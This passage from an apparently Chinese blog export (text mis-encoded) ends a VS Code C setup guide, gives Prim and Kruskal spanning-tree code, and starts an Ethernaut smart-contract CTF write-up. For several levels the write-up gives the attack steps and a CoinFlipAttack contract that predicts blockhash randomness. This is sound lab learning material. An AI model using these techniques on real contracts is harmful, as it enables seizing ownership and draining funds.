<span class="string">"always"</span>,</span><br><span class="line">                <span class="attr">"focus"</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">"panel"</span>: <span class="string">"shared"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"shell"</span>,</span><br><span class="line">            <span class="attr">"label"</span>: <span class="string">"gcc.exe build active file"</span>,</span><br><span class="line">            <span class="attr">"command"</span>: <span class="string">"D:\\mingw32\\bin\\gcc.exe"</span>,<span class="comment">//**********è¿™é‡Œè¦æ”¹ä½ çš„è·¯å¾„</span></span><br><span class="line">            <span class="attr">"args"</span>: [</span><br><span class="line">                <span class="string">"-g"</span>,</span><br><span class="line">                <span class="string">"$&#123;file&#125;"</span>,</span><br><span class="line">                <span class="string">"-o"</span>,</span><br><span class="line">                <span class="string">"$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"options"</span>: &#123;</span><br><span class="line">                <span class="attr">"cwd"</span>: <span class="string">"D:\\mingw32\\bin"</span><span class="comment">//**********è¿™é‡Œè¦æ”¹ä½ çš„è·¯å¾„</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"problemMatcher"</span>: [</span><br><span class="line">                <span class="string">"$gcc"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"group"</span>: <span class="string">"build"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ¥ç€å°†ä»£ç ä¸­æ³¨é‡Šéƒ¨åˆ†ç›¸åº”åœ°æ”¹ä¸ºä½ çš„è·¯å¾„å³å¯ã€‚</strong></p>
</li>
</ol>
<h2 id="5-æˆåŠŸï¼"><a href="#5-æˆåŠŸï¼" class="headerlink" title="5.æˆåŠŸï¼"></a>5.æˆåŠŸï¼</h2><p>ç„¶åä½ å†æµ‹è¯•ä½ çš„test.cï¼Œå‘ç°å¯ä»¥æˆåŠŸäº†ï¼Œä½†æ˜¯å‘½ä»¤çª—å£ä¸€é—ªè€Œè¿‡ï¼Œè§£å†³çš„åŠæ³•æ˜¯åœ¨returnè¯­å¥ä¹‹å‰åŠ </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">system(<span class="string">"pause"</span>);</span><br></pre></td></tr></table></figure>

<p>æˆ‘æ›´æ¨èä½¿ç”¨æ–­ç‚¹åŠŸèƒ½æ¥å®Œæˆ</p>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307112034.png" class>]]></content>
      <categories>
        <category>æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸¤ç§æ–¹æ³•æ±‚æœ€å°ç”Ÿæˆæ ‘</title>
    <url>/2020/10/15/%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95%E6%B1%82%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/</url>
    <content><![CDATA[<h2 id="Primç®—æ³•"><a href="#Primç®—æ³•" class="headerlink" title="Primç®—æ³•"></a><code>Prim</code>ç®—æ³•<a id="more"></a></h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXLEN 28</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="keyword">int</span> graph[MAXLEN][MAXLEN], minDis[MAXLEN];</span><br><span class="line"><span class="keyword">bool</span> visited[MAXLEN];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prim</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(visited,<span class="literal">false</span>,<span class="keyword">sizeof</span>(visited));</span><br><span class="line">    minDis[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    visited[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–å„ä¸ªç‚¹åˆ°æœ€å°ç”Ÿæˆæ ‘ç‚¹é›†ï¼Œå³åˆå§‹ç‚¹çš„è·ç¦»</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n;i++)</span><br><span class="line">        minDis[i] = graph[<span class="number">0</span>][i] == <span class="number">0</span> ? INF : graph[<span class="number">0</span>][i];</span><br><span class="line">    <span class="comment">// å¾ªç¯ n-1 æ¬¡å³å¯</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> u = <span class="number">-1</span>,minD = INF;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; n;j++)&#123;</span><br><span class="line">            <span class="comment">// æ‰¾å‡ºè¿æ¥ä¸¤ä¸ªé›†åˆä¸­æœ€çŸ­è¾¹çš„ç‚¹</span></span><br><span class="line">            <span class="keyword">if</span>(!visited[j] &amp;&amp; minD &gt; minDis[j])&#123;</span><br><span class="line">                u = j;</span><br><span class="line">                minD = minDis[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sum += minD;</span><br><span class="line">        visited[u] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j&lt; n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited[j] &amp;&amp; graph[u][j] != <span class="number">0</span> &amp;&amp; graph[u][j] &lt; minDis[j])&#123;</span><br><span class="line">                <span class="comment">// æ›´æ–°è¯¥ç‚¹åˆ°æœ€å°ç”Ÿæˆæ ‘ç‚¹é›†çš„è·ç¦»</span></span><br><span class="line">                minDis[j] = graph[u][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; sum &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Kruskalç®—æ³•ï¼ˆé…åˆå¹¶æŸ¥é›†ï¼‰"><a href="#Kruskalç®—æ³•ï¼ˆé…åˆå¹¶æŸ¥é›†ï¼‰" class="headerlink" title="Kruskalç®—æ³•ï¼ˆé…åˆå¹¶æŸ¥é›†ï¼‰"></a><code>Kruskal</code>ç®—æ³•ï¼ˆé…åˆå¹¶æŸ¥é›†ï¼‰</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> path[<span class="number">102</span>], parent[<span class="number">102</span>];</span><br><span class="line"><span class="keyword">int</span> n, edgeNum;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">villageEdge</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> u;</span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line">    <span class="keyword">int</span> dist;</span><br><span class="line">&#125;;</span><br><span class="line">villageEdge villages[<span class="number">5202</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">myCmp</span><span class="params">(villageEdge a, villageEdge b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.dist &lt; b.dist;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getParent</span><span class="params">(<span class="keyword">int</span> son)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p = parent[son];</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="number">0</span>) parent[son] = son;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (p != son) parent[son] = getParent(p);</span><br><span class="line">    <span class="keyword">return</span> parent[son];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MST</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> uParent, vParent, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; edgeNum;i++)&#123;</span><br><span class="line">        uParent = getParent(villages[i].u);</span><br><span class="line">        vParent = getParent(villages[i].v);</span><br><span class="line">        <span class="keyword">if</span>(vParent != uParent)&#123;</span><br><span class="line">            sum += villages[i].dist;</span><br><span class="line">            <span class="keyword">if</span>(path[uParent] &lt; path[vParent])&#123;</span><br><span class="line">                parent[uParent] = vParent;</span><br><span class="line">                path[vParent]++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                parent[vParent] = uParent;</span><br><span class="line">                path[uParent]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>æœ€å°ç”Ÿæˆæ ‘</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€Ethernauté—¯å…³å½•ã€‘ä¸Šç¯‡</title>
    <url>/2023/03/04/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%8A%E7%AF%87/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ— æ„ä¸­é‡åˆ°ä¸€ä¸ªç½‘ç«™<a href="https://ethernaut.openzeppelin.com/" target="_blank" rel="noopener">ã€Ethernautã€‘</a>ï¼Œç±»ä¼¼äº<code>ctf</code>å¹³å°ä¸€æ ·ï¼Œè¯¥ç½‘ç«™æœ‰å¤§æ¦‚30ä¸ªå…³å¡ï¼Œæ¯ä¸ªå…³å¡éƒ½ä¼šè€ƒå¯Ÿä¸€äº›æ™ºèƒ½åˆçº¦çš„å†…å®¹ï¼Œæ­£å¥½æŠŠå­¦æ¥çš„çŸ¥è¯†å®è·µä¸€ä¸‹ï¼Œæ¯•ç«Ÿçº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…ï¼Œç»çŸ¥æ­¤äº‹è¦èº¬è¡Œã€‚</p>
<p>æœ¬ç¯‡æ˜¯ç¬¬ä¸€éƒ¨åˆ†ï¼Œä¸»è¦æ¶‰åŠæ„é€ å‡½æ•°ã€<code>tx.origin</code>ä½¿ç”¨æ³¨æ„äº‹é¡¹ã€æ•´æ•°æº¢å‡ºã€<code>delegatecall</code>ã€<code>selfdestruct</code>ç­‰çŸ¥è¯†ã€‚</p>
<a id="more"></a>

<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><ul>
<li>metamaskï¼šæˆ‘ä½¿ç”¨çš„æ˜¯chromeæµè§ˆå™¨ï¼Œå®‰è£…è¿™ä¸ªæ’ä»¶æ¯”è¾ƒå®¹æ˜“ï¼Œå¾®è½¯çš„edgeä¹Ÿå¯ä»¥ï¼Œè€Œä¸”åè€…ä¸‹è½½æ’ä»¶æ¯”è¾ƒç®€å•</li>
<li>ä»¥å¤ªåŠæµ‹è¯•ç½‘ï¼šGoerliå’ŒSepoliaéƒ½å¯ä»¥ï¼Œæµ‹è¯•ä»£å¸å¯åˆ†åˆ«åœ¨<a href="https://goerli-faucet.pk910.de/" target="_blank" rel="noopener">ã€1ã€‘</a>å’Œ<a href="https://sepolia-faucet.pk910.de/" target="_blank" rel="noopener">ã€2ã€‘</a>å¤„è·å–ï¼Œè™½ç„¶å¾—åˆ°çš„ä¸å¤šï¼Œä½†æ˜¯è¶³å¤Ÿå®Œæˆæ‰€æœ‰å…³å¡äº†ã€‚</li>
<li>remixï¼šsolidityç¼–è¯‘å™¨ï¼Œæœ‰æ¡Œé¢ç‰ˆå’Œç½‘é¡µåœ¨çº¿ç‰ˆï¼Œæˆ‘æ˜¯ç”¨çš„æ˜¯ç½‘é¡µç‰ˆï¼Œè¿™æ˜¯<a href="https://remix.ethereum.org" target="_blank" rel="noopener">ã€é“¾æ¥ã€‘</a>ã€‚æ¡Œé¢ç‰ˆæ— æ³•è¿æ¥metamaskï¼Œæœ‰äº›å…³å¡éœ€è¦æˆ‘ä»¬éƒ¨ç½²ä¸€äº›åˆçº¦ï¼Œå¯¹äºremixç½‘é¡µç‰ˆæ¯”è¾ƒæ–¹ä¾¿ã€‚</li>
</ul>
<p>å¥½ï¼Œä»¥ä¸Šæ¡ä»¶éƒ½å‡†å¤‡å¥½ä»¥åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å¯æˆ‘ä»¬çš„é—¯å…³ä¹‹æ—…äº†ï¼</p>
<h2 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h2><p>è¿™ä¸€å…³å¡ä¸»è¦æ˜¯ç†Ÿæ‚‰æœ¬æ¸¸æˆçš„æ“ä½œè¿ç”¨ï¼Œä¸è¿‡è¯´å®è¯ï¼Œæœ¬å…³å¡æˆ‘è®¤ä¸ºå¹¶ä¸æ˜¯æœ€ç®€å•çš„ï¼Œæ²¡æœ‰äº›è„‘æ´ï¼Œæ ¹æœ¬æ²¡æ³•é€šå…³ã€‚</p>
<p>å› æ­¤åœ¨æ§åˆ¶å°è¾“å…¥ä»¥ä¸‹å‡½æ•°å³å¯é€šå…³ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.info()</span><br><span class="line"><span class="keyword">await</span> contract.info1()</span><br><span class="line"><span class="keyword">await</span> contract.info2(<span class="string">'hello'</span>)</span><br><span class="line"><span class="keyword">await</span> contract.infoNum()</span><br><span class="line"><span class="keyword">await</span> contract.info42()</span><br><span class="line"><span class="keyword">await</span> contract.theMethodName()</span><br><span class="line"><span class="keyword">await</span> contract.method7123949()</span><br><span class="line"><span class="keyword">await</span> contract.password()</span><br><span class="line"><span class="keyword">await</span> contract.authenticate(<span class="string">'ethernaut0'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address &#x3D;&gt; uint) public contributions;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    contributions[msg.sender] &#x3D; 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender &#x3D;&#x3D; owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">  &#x2F;&#x2F; è¦æ±‚å‘é€è¿‡æ¥çš„å°äº 0.001</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    &#x2F;&#x2F; å¦‚æœå‘èµ·æ–¹çš„è´¡çŒ®å¤§äºåˆçº¦æ‹¥æœ‰è€…çš„è´¡çŒ®ï¼Œåˆ™å½’å±æƒè½¬æ¢</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line">&#x2F;&#x2F; åªæœ‰åˆçº¦æ‹¥æœ‰è€…æ‰èƒ½å‘èµ·é€€æ¬¾</span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    payable(owner).transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line">&#x2F;&#x2F; æ³¨æ„è¿™é‡Œæ˜¯åˆ©ç”¨ç‚¹</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é€šå…³æ¡ä»¶ï¼š</strong></p>
<ol>
<li>è·å¾—åˆçº¦æ‰€æœ‰æƒ</li>
<li>å°†åˆçº¦æ‰€æœ‰è€…çš„ä½™é¢æ¸…é›¶</li>
</ol>
<p>è¦æƒ³æ”¹å˜åˆçº¦çš„ownerå¯ä»¥é€šè¿‡ä¸¤ç§æ–¹æ³•å®ç°ï¼š</p>
<ol>
<li>ä¸æ–­è°ƒç”¨contribute()å‡½æ•°</li>
<li>åˆçº¦æ¥æ”¶æ²¡æœ‰æ•°æ®çš„çº¯ether(ä¾‹å¦‚ï¼šè½¬è´¦å‡½æ•°))</li>
</ol>
<p>ç¬¬ä¸€ä¸ªä¸ç°å®ï¼Œæˆ‘ä»¬ä½¿ç”¨ç¬¬äºŒä¸ªã€‚</p>
<p>æ”»å‡»æ­¥éª¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract.contribute(&#123;value: 1&#125;) &#x2F;&#x2F;é¦–å…ˆä½¿è´¡çŒ®å€¼å¤§äº0</span><br><span class="line">contract.sendTransaction(&#123;value: 1&#125;) &#x2F;&#x2F;è§¦å‘fallbackå‡½æ•°</span><br><span class="line">contract.withdraw() &#x2F;&#x2F;å°†åˆçº¦çš„balanceæ¸…é›¶</span><br></pre></td></tr></table></figure>

<h2 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#x2F;* constructor *&#x2F;</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    allocations[owner] &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">	        require(</span><br><span class="line">	            msg.sender &#x3D;&#x3D; owner,</span><br><span class="line">	            &quot;caller is not the owner&quot;</span><br><span class="line">	        );</span><br><span class="line">	        _;</span><br><span class="line">	    &#125;</span><br><span class="line">&#x2F;&#x2F; è°ƒç”¨æ–¹ä»½é¢å¢åŠ </span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] &#x3D; allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line">&#x2F;&#x2F; å‘allocatorè½¬è´¦æ•°é‡ä¸º allocations[allocator]</span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line">&#x2F;&#x2F; å‘å‘èµ·æ–¹è½¬è´¦æ‰€æœ‰çš„ï¼ˆåˆçº¦çš„ï¼‰ä½™é¢</span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é€šå…³æ¡ä»¶</strong>ï¼šè·å¾—åˆçº¦æ‰€æœ‰æƒã€‚</p>
<p>è™½ç„¶ä»£ç ä¸­æ²¡æœ‰ä»»ä½•å…³äºè·å–æ‰€æœ‰æƒçš„ä»£ç ï¼Œä½†æ˜¯ä»”ç»†ä¸€çœ‹ï¼Œå‘ç°æ„é€ å‡½æ•°å†™é”™äº†ï¼Œå› æ­¤æ‰€æœ‰äººéƒ½å¯ä»¥è°ƒç”¨<code>Fal1out()</code>å‡½æ•°æ¥è·å¾—æƒé™ã€‚</p>
<p>æ”»å‡»æ­¥éª¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">await contract.Fal1out(&#123;value: 1&#125;)</span><br></pre></td></tr></table></figure>

<p>ç„¶åsubmit</p>
<h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR &#x3D; 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    consecutiveWins &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue &#x3D; uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">    if (lastHash &#x3D;&#x3D; blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash &#x3D; blockValue;</span><br><span class="line">    uint256 coinFlip &#x3D; blockValue &#x2F; FACTOR;</span><br><span class="line">    bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;</span><br><span class="line"></span><br><span class="line">   &#x2F;&#x2F; è¦çŒœ side çš„å˜é‡çš„å€¼</span><br><span class="line">    if (side &#x3D;&#x3D; _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins &#x3D; 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é€šå…³æ¡ä»¶</strong>ï¼šå°†<code>consecutiveWins</code>å¢åŠ åˆ°10</p>
<p>é¢˜æ„æ˜¯è¦æˆ‘ä»¬â€œçŒœâ€œä¸Šä¸€ä¸ªåŒºå—çš„å“ˆå¸Œå€¼è½¬ä¸º<code>uint256</code>åï¼Œé™¤ä»¥FACTORåæ˜¯ä¸æ˜¯1ï¼Œè¦è¿ç»­çŒœå¯¹10æ¬¡ï¼Œæ³¨æ„æ¯æ¬¡éƒ½è¦ç­‰æ–°åŒºå¿«å‡ºç°åæ‰è°ƒç”¨ï¼Œå¦åˆ™ä¼šè§¦å‘<code>lastHash == blockValue</code>ã€‚</p>
<p>çœ‹ä¸Šå»ï¼Œå¾ˆéš¾çŒœå¾—ä¸­ï¼Œä½†æ˜¯å®é™…ä¸ŠåŒºå—çš„å“ˆå¸Œæˆ‘æ˜¯<strong>å¯ä»¥è·å–åˆ°</strong>çš„ï¼åœ¨æ§åˆ¶å°è¾“å…¥<code>help()</code>å‘ç°åªæœ‰<code>getBlockNumber()</code>å‡½æ•°å¯ä»¥ä½¿ç”¨ï¼Œæ— æ³•ä½¿ç”¨<code>blockhash()</code>å‡½æ•°ï¼Œçœ‹æ¥ä¸èƒ½ä»…ä½¿ç”¨æ§åˆ¶å°äº†ã€‚</p>
<p>å®é™…ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªè¾…åŠ©çš„åˆçº¦ï¼Œåœ¨åˆçº¦ä¸­ä½¿ç”¨<code>blockhash</code>å‡½æ•°ï¼Œéƒ¨ç½²å’Œè°ƒç”¨åˆçº¦ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨remixï¼Œç„¶åå°†å…¶è¿æ¥åˆ°metamaskä¸­ï¼Œè¿æ¥è¿‡ç¨‹å¯å‚è€ƒ<a href="https://www.freesion.com/article/87861092736/#:~:text=%E4%BD%BF%E7%94%A8remix%E4%B8%8EMetaMask%E8%BF%9B%E8%A1%8C%E5%8F%91%E5%B8%83%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%EF%BC%88%E4%BB%A3%E5%B8%81%EF%BC%89%E6%9C%80%E5%85%A8%E6%95%99%E7%A8%8B%201%20%E5%9C%A8%E7%BA%BF%E7%BC%96%E8%BE%91%E5%99%A8%E5%9C%B0%E5%9D%80%20%E7%BC%96%E8%BE%91%E5%99%A8%E5%9C%B0%E5%9D%80%20%E8%AF%B7%E6%B3%A8%E6%84%8F%E5%A6%82%E6%9E%9C%E7%BC%96%E8%BE%91%E5%99%A8%E6%97%A0%E6%B3%95%E4%B8%8EMetaMask%E8%BF%9E%E6%8E%A5%E7%9A%84%E6%97%B6%E5%80%99%E7%94%A8%20http,%E5%8D%8F%E8%AE%AE%E6%89%93%E5%BC%80%EF%BC%8C%E4%B8%8D%E8%A6%81%E7%94%A8%20https%20%2C%E6%88%91%E4%B9%9F%E4%B8%8D%E7%9F%A5%E9%81%93%E4%B8%BA%E4%BB%80%E4%B9%88%EF%BC%8C%E6%9C%89%E6%97%B6%E5%80%99%E4%BC%9A%E5%8F%91%E7%94%9F%E8%BF%99%E7%A7%8D%E4%BA%8B%E6%83%85%EF%BC%8C%E6%8D%A2%E4%B8%AA%E5%8D%8F%E8%AE%AE%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A5%E3%80%82%20https%E5%85%B6%E5%AE%9E%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A5%EF%BC%8C%E4%B8%8D%E8%A6%81%E8%A7%89%E5%BE%97%E5%8F%AA%E6%9C%89http%E5%8F%AF%E4%BB%A5%E8%BF%9E%E6%8E%A5%202%20%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%201.remix%E4%B8%8EMetaMask%E8%BF%9B%E8%A1%8C%E8%BF%9E%E6%8E%A5" target="_blank" rel="noopener">ã€ä½¿ç”¨REMIXä¸METAMASKè¿›è¡Œå‘å¸ƒæ™ºèƒ½åˆçº¦ï¼ˆä»£å¸ï¼‰æœ€å…¨æ•™ç¨‹ã€‘</a></p>
<p>ä¸‹é¢æ˜¯æ”»å‡»åˆçº¦ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface CoinFlip &#123;</span><br><span class="line">  function flip(bool _guess) external returns (bool) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CoinFlipAttack &#123;</span><br><span class="line">	&#x2F;&#x2F; è¯¥åœ°å€å¯ä»¥åœ¨æ§åˆ¶å°ä¸­è¾“å…¥ &#96;await contract&#96; è·å–</span><br><span class="line">    CoinFlip constant private target &#x3D; CoinFlip(0xbE079d11154090c4337c8958c33cD8D5Dc0409B1);</span><br><span class="line">    uint256 FACTOR &#x3D; 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        uint256 blockValue &#x3D; uint256(blockhash(block.number-1));</span><br><span class="line">        uint256 coinFlip &#x3D; blockValue &#x2F; FACTOR;</span><br><span class="line">        bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;</span><br><span class="line">        target.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸æ–­è°ƒç”¨<code>attack()</code>å‡½æ•°ï¼Œç›´è‡³åœ¨æ§åˆ¶å°è°ƒç”¨<code>await contract.consecutiveWins()</code>çš„è¿”å›å€¼å¤§äº10ï¼Œå³å¯è¿›è¡Œæäº¤</p>
<h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><p>å…ˆçœ‹åˆçº¦ä»£ç ï¼š</p>
